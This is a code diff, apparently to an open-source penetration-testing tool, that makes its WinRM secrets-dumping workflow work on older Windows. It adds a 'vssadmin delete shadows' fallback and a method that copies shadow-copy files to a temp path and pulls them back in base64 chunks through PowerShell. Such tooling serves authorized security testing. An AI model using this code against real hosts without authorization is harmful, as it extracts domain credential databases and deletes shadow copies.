@@ -1,8 +1,13 @@
+import base64
+import contextlib
 import time
 from binascii import hexlify
 
 from impacket.examples.secretsdump import LocalOperations
+from pypsrp.exceptions import WSManFaultError
 from pypsrp.wsman import SelectorSet
+
+from nxc.helpers.misc import gen_random_string
 
 WMI_BASE = "http://schemas.microsoft.com/wbem/wsman/1/wmi"
 
@@ -30,7 +35,15 @@ class RemoteOperations:
         selector = SelectorSet()
         selector.add_option("ID", shadow_id)
         self.logger.debug(f"Trying to delete ShadowCopy with ID {shadow_id}")
-        self.wsman.delete(f"{WMI_BASE}/root/cimv2/Win32_ShadowCopy", selector_set=selector)
+        try:
+            self.wsman.delete(f"{WMI_BASE}/root/cimv2/Win32_ShadowCopy", selector_set=selector)
+        except WSManFaultError as e:
+            # WinRM 2.0 (2008 R2 / Windows 7) does not support WS-Delete on
+            # the WMI plugin: fall back to vssadmin through the shell
+            if e.code != 2150858801:
+                raise
+            self.logger.debug(f"WMI plugin has no Delete operation, falling back to vssadmin for {shadow_id} (process creation)")
+            self.connection.execute(f"vssadmin delete shadows /shadow={shadow_id} /quiet", True)
         self.logger.debug(f"ShadowCopy with ID {shadow_id} successfully deleted")
         self._created_shadow_ids.remove(shadow_id)
 
@@ -118,10 +131,50 @@ class RemoteOperations:
         self.logger.debug(f"Try fetching file {remote_path}")
         try:
             self.connection.conn.fetch(remote_path, download_path)
+            return True
         except Exception as e:
             self.logger.debug(f"Cannot fetch {remote_path}: {e}")
+        # PowerShell 2.0 / .NET 2.0 (2008 R2, Windows 7) refuse kernel paths
+        # when resolving the fetch script path, whatever their form: the
+        # GLOBALROOT prefix through \\?\, \\.\ or \??\, and even a bare
+        # \Device\ path, all get rejected by the CLR 2.0 normalization
+        # before reaching the syscall. Only native tools read them: copy the
+        # file to a normal path, fetch that and clean it up
+        temp_path = f"C:\\Windows\\Temp\\{gen_random_string(8)}"
+        try:
+            copy_command = f'copy /Y "{remote_path}" {temp_path}'
+            self.connection.ps_execute(f"cmd /c '{copy_command}'", True)
+            try:
+                self.connection.conn.fetch(temp_path, download_path)
+                return True
+            except Exception as e:
+                self.logger.debug(f"Cannot fetch {temp_path}: {e}")
+            # PowerShell 2.0 OOMs serializing the single big output object
+            # the fetch script builds: read the copy in base64 chunks instead
+            return self._fetch_chunked(temp_path, download_path)
+        except Exception as e:
+            self.logger.debug(f"Cannot copy {remote_path} to a readable path: {e}")
             return False
-        return True
+        finally:
+            with contextlib.suppress(Exception):
+                self.connection.ps_execute(f"cmd /c 'del {temp_path}'", True)
+
+    def _fetch_chunked(self, remote_path, download_path, chunk_size=1024 * 1024):
+        with open(download_path, "wb") as file:
+            offset = 0
+            while True:
+                command = (
+                    f"$fs=[IO.File]::OpenRead('{remote_path}'); $fs.Seek({offset}, 0) | Out-Null; "
+                    f"$b=New-Object byte[] {chunk_size}; $n=$fs.Read($b, 0, {chunk_size}); "
+                    f"if ($n -lt {chunk_size}) {{ $b2=New-Object byte[] $n; [Array]::Copy($b, $b2, $n); $b=$b2 }}; "
+                    "[Convert]::ToBase64String($b); $fs.Close()"
+                )
+                output = self.connection.ps_execute(command, True)
+                chunk = base64.b64decode((output or "").strip())
+                file.write(chunk)
+                if len(chunk) < chunk_size:
+                    return True
+                offset += len(chunk)
 
     def get_ntds_location(self):
         """Read the NTDS database path from the registry through StdRegProv."""
